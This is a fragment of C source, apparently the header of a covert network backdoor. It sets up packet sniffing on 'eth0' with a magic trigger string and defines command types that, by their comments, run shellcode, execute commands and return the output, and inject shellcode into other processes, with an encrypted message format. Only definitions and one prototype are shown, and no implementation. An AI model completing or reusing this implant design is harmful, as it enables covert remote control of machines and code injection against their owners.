#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>


#define SIZE_ETHERNET   14
#define STACK_SIZE      16384
#define MAX_PACKET_SIZE 1024
#define INTERFACE		   "eth0"
#define MAGIC           "GOATSE"
#define REDIRECT		   " 2>&1"

#define MESSAGE_SHELLCODE 		      0x01  // Fork and run the shellcode
#define MESSAGE_COMMAND 		      0x02  // Run a command and send back the response
#define MESSAGE_REMOTE_SHELLCODE	   0x04  // Inject shellcode into another process
#define MESSAGE_WINDOWS_32          0x08  
#define MESSAGE_LINUX_32            0x10


#ifdef DEBUG
#define DEBUG_WRAP(code) code
#else
#define DEBUG_WRAP(code)
#endif


#define LOG(level, ...) { fprintf(stderr, "%s: ", level); fprintf(stderr, __VA_ARGS__); fprintf(stderr, "\n"); }
#define LOG_ERROR(...) { LOG("ERROR", __VA_ARGS__); }
#define LOG_DEBUG(...) { DEBUG_WRAP(LOG("DEBUG", __VA_ARGS__)); }

uint32_t decrypt_message(const uint8_t *data, uint8_t *decoded_data, uint32_t len, uint8_t *key);
